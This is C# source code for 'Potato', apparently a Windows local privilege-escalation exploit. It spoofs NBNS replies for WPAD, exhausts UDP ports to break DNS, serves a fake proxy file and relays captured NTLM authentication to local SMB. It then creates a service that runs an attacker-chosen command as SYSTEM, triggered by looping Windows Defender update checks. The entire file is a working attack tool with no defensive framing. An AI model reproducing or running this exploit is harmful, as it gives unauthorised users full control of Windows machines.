﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.Threading;
using System.Net;
using SharpCifs;
using SharpCifs.Smb;
using NHttp;
using SharpCifs.Dcerpc;
using SharpCifs.Dcerpc.Msrpc;
using System.Net.Sockets;
using System.Runtime.InteropServices;

namespace Potato
{
    class HTTPNtlmHandler
    {
        public AutoResetEvent finished = new AutoResetEvent(false);
        private int state = 0;
        private String cmd;
        private String[] wpad_exclude;
        private Queue<byte[]> ntlmQueue = new Queue<byte[]>();
        Thread smbRelayThread;
        SMBRelay smbRelay = new SMBRelay();
        String workingUri = null;

        private byte[] getNtlmBlock(String header)
        {
            byte[] data;
            if (header.StartsWith("NTLM "))
            {
                data = Convert.FromBase64String(header.Substring(5));
            }
            else
            {
                data = null;
            }
            return data;
        }
        private String getHeaderString(System.Collections.Specialized.NameValueCollection headers)
        {
            String headerString = "";
            foreach (String key in headers){
                headerString = headerString + key + ":" + headers[key] + "\n";
            }
            return headerString;
        }
        public void recvRequest(object sender, HttpRequestEventArgs e)
        {
            using (var writer = new StreamWriter(e.Response.OutputStream))
            {

                HttpRequest request = e.Request;
                // Obtain a response object.
                HttpResponse response = e.Response;
                // Construct a response.
                System.Collections.Specialized.NameValueCollection headers = request.Headers;
                Console.WriteLine("Got Request: "+request.HttpMethod+" "+request.Url.AbsoluteUri.ToString()+"!");

                if (request.HttpMethod.ToLower().Equals("head") || request.HttpMethod.ToLower().Equals("get") || request.HttpMethod.ToLower().Equals("post") || request.HttpMethod.ToLower().Equals("options") || request.HttpMethod.ToLower().Equals("put"))
                {
                    if (request.Url.AbsoluteUri.ToString().Contains("localhost/GETHASHES"))
                    {
                        Console.WriteLine("Sending 401...");
                        if (headers["Authorization"] == null && workingUri == null)
                        {
                            Console.WriteLine("Got request for hashes...");
                            response.Headers.Add("WWW-Authenticate","NTLM");
                            response.StatusCode = 401;
                            state = 0;                          
                        }
                       
                        else
                        {
                            String authHeader = headers["Authorization"];
                            byte[] ntlmBlock = getNtlmBlock(authHeader);
                            if (ntlmBlock != null && (workingUri == null || workingUri == request.Url.AbsoluteUri.ToString()))
                            {
                                workingUri = request.Url.AbsoluteUri.ToString();
                                if (state == 0)
                                {
                                    Console.WriteLine("Parsing initial NTLM auth...\n"+authHeader);
                                    smbRelayThread = new Thread(()=>smbRelay.startSMBRelay(ntlmQueue,this.cmd));
                                    smbRelayThread.Start();
                                    ntlmQueue.Enqueue(ntlmBlock);
                                    byte[] challenge = null;
                                    Config.signalHandlerClient.WaitOne();
                                    challenge = ntlmQueue.Dequeue();
                                    Console.WriteLine("Got SMB challenge " + Convert.ToBase64String(challenge));
                                    if(challenge != null){
                                        response.Headers.Add("WWW-Authenticate","NTLM " + Convert.ToBase64String(challenge));
                                        state = state + 1;
                                        response.StatusCode = 401;
                                    }
                                }
                                else if (state == 1 && request.Url.AbsoluteUri.ToString().Equals(workingUri))
                                {
                                    Console.WriteLine("Parsing final auth...");
                                    if (ntlmBlock[8] == 3)
                                    {
                                        Console.WriteLine(Convert.ToBase64String(ntlmBlock));
                                    }
                                    ntlmQueue.Enqueue(ntlmBlock);
                                    Config.signalHandler.Set();
                                    response.StatusCode = 200;
                                    state = state + 1;
                                    Config.signalHandlerClient.WaitOne();
                                    byte[] checkStatus = ntlmQueue.Dequeue();
                                    if (checkStatus[0] == 99)
                                    {
                                        writer.Close();
                                        smbRelayThread.Abort();
                                        finished.Set();
                                        return;
                                    }
                                    else
                                    {
                                        workingUri = null;
                                    }
                                }
                            }
                        }
                        writer.Close();
                        return;
                    }
                    else if (request.Url.AbsoluteUri.ToString().Equals("http://127.0.0.1/wpad.dat") || request.Url.AbsoluteUri.ToString().Equals("http://wpad/wpad.dat"))
                    {
                        Console.WriteLine("Spoofing wpad...");
                        response.StatusCode = 200;
                        String responseTxt = "function FindProxyForURL(url,host){if (dnsDomainIs(host, \"localhost\")) return \"DIRECT\";";
                        for (int i = 0; i < wpad_exclude.Length;i++ )
                        {
                            responseTxt = responseTxt + "if (dnsDomainIs(host, \"" + wpad_exclude[i] + "\")) return \"DIRECT\";";
                        }
                        responseTxt = responseTxt + "return \"PROXY 127.0.0.1:80\";}";
                        writer.Write(responseTxt);
                    }
                    else if (workingUri == null && !request.Url.AbsoluteUri.ToString().Contains("wpad") && !request.Url.AbsoluteUri.ToString().Contains("favicon"))
                    {
                        Random rnd = new Random();
                        int sess = rnd.Next(1, 1000000);
                        response.Headers.Add("Location", "http://localhost/GETHASHES"+sess);
                        Console.WriteLine("Redirecting to target.."+response.Headers["Location"]);
                        response.StatusCode = 302;
                        writer.Close();
                    }
                   
                }
                else if (request.HttpMethod.ToLower().Equals("propfind"))
                {
                    if (request.Url.AbsoluteUri.ToString().Equals("http://localhost/test"))
                    {
                        Console.WriteLine("Got PROPFIND for /test... Responding");
                        response.StatusCode = 207;
                        response.ContentType = "application/xml";
                        writer.Write("<?xml version='1.0' encoding='UTF-8'?><ns0:multistatus xmlns:ns0=\"DAV:\"><ns0:response><ns0:href>/test/</ns0:href><ns0:propstat><ns0:prop><ns0:resourcetype><ns0:collection /></ns0:resourcetype><ns0:creationdate>2015-08-03T14:53:38Z</ns0:creationdate><ns0:getlastmodified>Tue, 11 Aug 2015 15:48:25 GMT</ns0:getlastmodified><ns0:displayname>test</ns0:displayname><ns0:lockdiscovery /><ns0:supportedlock><ns0:lockentry><ns0:lockscope><ns0:exclusive /></ns0:lockscope><ns0:locktype><ns0:write /></ns0:locktype></ns0:lockentry><ns0:lockentry><ns0:lockscope><ns0:shared /></ns0:lockscope><ns0:locktype><ns0:write /></ns0:locktype></ns0:lockentry></ns0:supportedlock></ns0:prop><ns0:status>HTTP/1.1 200 OK</ns0:status></ns0:propstat></ns0:response></ns0:multistatus>");    
                        writer.Close();
                    }
                    else
                    {
                        Console.WriteLine("Got PROPFIND for "+request.Url.AbsoluteUri.ToString()+" returning 404");
                        response.StatusCode = 404;
                        writer.Close();
                    }
                }
                else
                {
                    Console.WriteLine("Got " + request.HttpMethod + " for " + request.Url.AbsoluteUri.ToString()+" replying 404");
                    response.StatusCode = 404;
                    writer.Close();
                }

            }
        
        }
        
        public void startListening(String cmd,String[] wpad_exclude)
        {

            NHttp.HttpServer server = new NHttp.HttpServer();
            this.cmd = cmd;
            this.wpad_exclude = wpad_exclude;
            server.EndPoint = new IPEndPoint(IPAddress.Loopback, 80);
            server.RequestReceived += recvRequest;
            server.Start();
            Console.WriteLine("Listening...");
            while (true)
            {
                Thread.Sleep(5000);
            }
        }
    }
    class SMBRelay
    {
        public bool doPsexec(String binPath, NtlmPasswordAuthentication auth,String cmd)
        {
            Random rnd = new Random();
            int randInt = rnd.Next(1,10000000);
            String host = "127.0.0.1";
            DcerpcHandle handle = DcerpcHandle.GetHandle("ncacn_np:" + host + "[\\pipe\\svcctl]", auth);

            // Open the SCManager on the remote machine and get a handle
            // for that open instance (scManagerHandle).
            Rpc.PolicyHandle scManagerHandle = new Rpc.PolicyHandle();
            svcctl.OpenSCManager openSCManagerRpc = new svcctl.OpenSCManager("\\\\" + host, null,
                    (0x000F0000 | 0x0001 | 0x0002 | 0x0004 | 0x0008 | 0x0010 | 0x0020), scManagerHandle);
            handle.Sendrecv(openSCManagerRpc);
            if (openSCManagerRpc.retval != 0)
            {
                throw new SmbException(openSCManagerRpc.retval, true);
            }

            Rpc.PolicyHandle svcHandle = new Rpc.PolicyHandle();
            svcctl.OpenService openServiceRpc = new svcctl.OpenService(scManagerHandle,
                    "GetShell"+randInt, svcctl.SC_MANAGER_ALL_ACCESS, svcHandle);
            handle.Sendrecv(openServiceRpc);

            // If the service didn't exist, create it.
            if (openServiceRpc.retval == 1060)
            {
                // Create a new service.
                svcHandle = new Rpc.PolicyHandle();
                //code 272 is for an interactive, own process service this was originally svcctl.SC_TYPE_SERVICE_WIN32_OWN_PROCESS
                svcctl.CreateServiceW createServiceWRpc = new svcctl.CreateServiceW(
                        scManagerHandle, "GetShell"+randInt, "GetShell"+randInt,
                        svcctl.SC_MANAGER_ALL_ACCESS, 272,
                        svcctl.SC_START_TYPE_SERVICE_DEMAND_START, svcctl.SC_SERVICE_ERROR_NORMAL,
                        cmd,
                        null, null, null, 0, null, null, 0, svcHandle);
                handle.Sendrecv(createServiceWRpc);
                if (createServiceWRpc.retval != 0)
                {
                    throw new SmbException(createServiceWRpc.retval, true);
                }
            }
            
            svcctl.StartService startServiceRpc = new svcctl.StartService(svcHandle, 0, new String[0]);
            handle.Sendrecv(startServiceRpc);
            return true;
        }
        public void startSMBRelay(Queue<byte[]> ntlmQueue,String cmd)
        {
            Config.setNtlmContextFactory(new Config.QueuedNtlmContextFactoryImpl());
            NtlmPasswordAuthentication auth = new NtlmPasswordAuthentication(".", "", "");
            auth.additionalData = ntlmQueue;
            Console.WriteLine("Setting up SMB relay...");
            /*
            SmbFile f = new SmbFile("smb://127.0.0.1/C$/Windows/System32/utilman.exe", auth);
            SmbFileOutputStream os = new SmbFileOutputStream(f);
            os.Write(System.Text.Encoding.Unicode.GetBytes("start cmd.exe /k \"whoami\""));
            os.Close();*/
            
            bool status = doPsexec("C:\\Windows\\System32\\cmd.exe", auth,cmd);
            if (status)
            {
                Console.WriteLine("Successfully started service");
                ntlmQueue.Enqueue(new byte[] { 99 });
                Config.signalHandlerClient.Set();
            }
            else
            {
                Console.WriteLine("Failed");
            }
        }
    }


    abstract class Spoofer
    {
        public static byte[] StringToByteArray(string hex)
        {
            return Enumerable.Range(0, hex.Length)
                             .Where(x => x % 2 == 0)
                             .Select(x => Convert.ToByte(hex.Substring(x, 2), 16))
                             .ToArray();
        }
        public abstract void startSpoofing(String localIp, String spoof_host, bool disableExhaust);
        public abstract void checkSpoof(String host);
    }

    class NBNSSpoofer : Spoofer
    {
        [DllImport("dnsapi.dll", EntryPoint = "DnsFlushResolverCache")]
        private static extern UInt32 DnsFlushResolverCache();

        public static bool doneUdp = false;
        public static bool doneSpoof = false;

        public static string ByteArrayToString(byte[] ba)
        {
            string hex = BitConverter.ToString(ba);
            return hex.Replace("-", ",");
        }

        private byte[] createNbnsResponse(String host)
        {
            byte[] packet = new byte[62] {0xdb,0xa0,0x85,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0xAA,0x00,0x00,0x20,0x00,0x01,0x00,0x04,0x93,0xe0,0x00,0x06,0x00,0x00,0x7f,0x00,0x00,0x01};
	        
            host = host.ToUpper();
            packet[12] = 0x20;
            for (int i=0;i<host.Length;i++){
                packet[13+(i*2)] = (byte)((host[i]>>4)+0x41);
                packet[13+(i*2)+1] = (byte)((host[i]&0xF)+0x41);
            }
            for (int j=0;j<15-host.Length;j=j+1){
                packet[13+host.Length*2+j*2] = 0x43;
                packet[13+host.Length*2+j*2+1] = 0x41;       
            }

            packet[43] = 0x41;
            packet[44]=0x41;
            packet[45]=0x00;

           return packet;
        }

        public override void startSpoofing(String localIp,String spoof_host, bool disableExhaust)
        {
            Console.WriteLine("Starting NBNS spoofer...");
            Thread spoofThread = new Thread(() => this.exhaustUdpPorts(137));
            if (!disableExhaust)
            {
                spoofThread.Start();
                while (!NBNSSpoofer.doneUdp)
                {
                    Thread.Sleep(2000);
                }
            }
            UInt32 result = DnsFlushResolverCache();
            UdpClient udpc = new UdpClient(137);
            IPAddress serverAddr = IPAddress.Parse(localIp);
            IPEndPoint endPoint = new IPEndPoint(serverAddr, 137);
            udpc.Connect(endPoint);
            byte[] packet = createNbnsResponse(spoof_host);

            while (true)
            {
                for (byte i = 0; i < 255; i++)
                {
                    for (byte j = 0; j < 255; j++)
                    {
                        packet[0] = i;
                        packet[1] = j;
                        udpc.Send(packet, packet.Length);
                    }
                }

            }
        }

        public override void checkSpoof(String host)
        {
            IPAddress[] hostIp = null;
            int count =501;
            while (hostIp == null || hostIp.Length == 0 || !hostIp[0].ToString().Equals("127.0.0.1"))
            {
                count = count + 1;
                if (count > 500)
                {
                    count = 0;
                    Console.WriteLine("Clearing dns and nbns cache...");
                    UInt32 result = DnsFlushResolverCache();
                    
                    System.Diagnostics.Process process3 = new System.Diagnostics.Process();
                    System.Diagnostics.ProcessStartInfo startInfo3 = new System.Diagnostics.ProcessStartInfo();
                    startInfo3.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
                    startInfo3.FileName = "cmd.exe";
                    startInfo3.Arguments = "/C nbtstat -R";
                    process3.StartInfo = startInfo3;
                    process3.Start();
                    process3.WaitForExit();

                }
                try
                {
                    hostIp = Dns.GetHostAddresses(host);
                }
                catch (Exception e)
                {

                }
            }
            Console.WriteLine("Got " + hostIp[0].ToString());
            doneSpoof = true;
        }

        public void exhaustUdpPorts(int leave)
        {
            Console.Write("Exhausting UDP source ports so DNS lookups will fail...");
            List<Socket> sockList = new List<Socket>();
            List<int> failedPorts = new List<int>();
            int i=0;
            for (i = 0; i <= 65535; i++)
            {
                try
                {
                    if (i != leave && i != 53)
                    {
                        IPEndPoint endp = new IPEndPoint(IPAddress.Any, i);
                        Socket sock = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
                        sock.Bind(endp);
                        sockList.Add(sock);
                    }
                }
                catch (Exception e)
                {
                    failedPorts.Add(i);
                    Console.WriteLine("Couldn't bind to a UDP port "+i);
                }
            }

            bool success = false;
            while (!success)
            {
                UInt32 result = DnsFlushResolverCache();
                try
                {
                    IPAddress[] hostIp = Dns.GetHostAddresses("microsoft.com");
                }
                catch (Exception e)
                {
                    Console.WriteLine("DNS lookup fails - UDP Exhaustion worked!");
                    success = true;
                    break;
                }
                Console.WriteLine("DNS lookup succeeds - UDP Exhaustion failed!");
                foreach (int port in failedPorts)
                {
                    try
                    {
                        IPEndPoint endp = new IPEndPoint(IPAddress.Any, i);
                        Socket sock = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
                        sock.Bind(endp);
                        sockList.Add(sock);
                        failedPorts.Remove(port);
                    }
                    catch(Exception e)
                    {
                        Console.WriteLine("Failed to bind to " + port + " during cleanup...");
                    }
                } 
            }
            Console.WriteLine("UDP Ports exhausted...");
            NBNSSpoofer.doneUdp = true;
        }
    }

    class UpdateLauncher
    {
        public void launchUpdateCheck()
        {
            while (File.Exists("C:\\Program Files\\Windows Defender\\MpCmdRun.exe"))
            {
                Console.WriteLine("Checking for windows defender updates...");
                System.Diagnostics.Process process3 = new System.Diagnostics.Process();
                System.Diagnostics.ProcessStartInfo startInfo3 = new System.Diagnostics.ProcessStartInfo();
                startInfo3.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
                startInfo3.FileName = "cmd.exe";
                startInfo3.Arguments = "/C \"C:\\Program Files\\Windows Defender\\MpCmdRun.exe\" -SignatureUpdate";
                process3.StartInfo = startInfo3;
                process3.Start();
                process3.WaitForExit();
            }
        }
    }

    class Program
    {
        static Dictionary<string, string> parseArgs(string[] args)
        {
            Dictionary<string, string> ret = new Dictionary<string, string>();
            if (args.Length % 2 == 0 && args.Length > 0){
                for (int i=0;i<args.Length;i=i+2)
                {
                    ret.Add(args[i].Substring(1), args[i + 1]);
                }
            }
            return ret;
        }
        static int Main(string[] args)
        {
            Dictionary<string, string> argDict = parseArgs(args);
            String cmd = "\"C:\\Windows\\System32\\cmd.exe\" /K start";
            String ip = null, disable_exhaust = null, disable_spoof = null, disable_defender = null, spoof_host = "WPAD";
            String wpad_exclude_str="potatopotato.com";
   
            if (argDict.ContainsKey("ip")) ip = argDict["ip"];
            if (argDict.ContainsKey("cmd")) cmd = argDict["cmd"];
            if (argDict.ContainsKey("disable_exhaust")) disable_exhaust = argDict["disable_exhaust"];
            if (argDict.ContainsKey("disable_defender")) disable_defender = argDict["disable_defender"];
            if (argDict.ContainsKey("disable_spoof")) disable_spoof = argDict["disable_spoof"];
            if (argDict.ContainsKey("spoof_host")) spoof_host = argDict["spoof_host"];
            if (argDict.ContainsKey("wpad_exclude")) wpad_exclude_str = argDict["wpad_exclude"];

            if (ip == null)
            {
                Console.WriteLine("Usage: potato.exe -ip <ip address, required> -cmd <command, optional> -disable_exhaust <true/false, optional> -disable_defender <true/false, optional> -disable_spoof <true/false, optional> -spoof_host <default wpad, optional> -wpad_exclude <comma separated host to exclude, optional>");
                return 0;
            }
            bool disableExhaust = false;
            if (disable_exhaust != null && disable_exhaust.Equals("true"))
            {
                disableExhaust = true;
            }

            Spoofer spoof;
            spoof = new NBNSSpoofer();
     
            HTTPNtlmHandler httpServer = new HTTPNtlmHandler();
            String[] wpad_exclude = wpad_exclude_str.Split(',');
            Thread httpServerThread = new Thread(() => httpServer.startListening(cmd,wpad_exclude));
            httpServerThread.Start();
            
            Thread spoofThread = new Thread(() => spoof.startSpoofing(ip, spoof_host, disableExhaust));

            if (disable_spoof == null || disable_spoof.Equals("false"))
            {
                spoofThread.Start();
                if (!disableExhaust)
                {
                    while (NBNSSpoofer.doneUdp == false)
                    {
                        Thread.Sleep(2000);
                    }
                }
                spoof.checkSpoof(spoof_host);
                Console.WriteLine("Spoofed target " + spoof_host + " succesfully...");
            }

            UpdateLauncher updateL = new UpdateLauncher();
            Thread updateLThread = new Thread(() => updateL.launchUpdateCheck());
            if (disable_defender == null || disable_defender.Equals("false"))
            {
                updateLThread.Start();
            }

            httpServer.finished.WaitOne();
            spoofThread.Abort();
            updateLThread.Abort();
            httpServerThread.Abort();
            return 0;
        }
    }
}
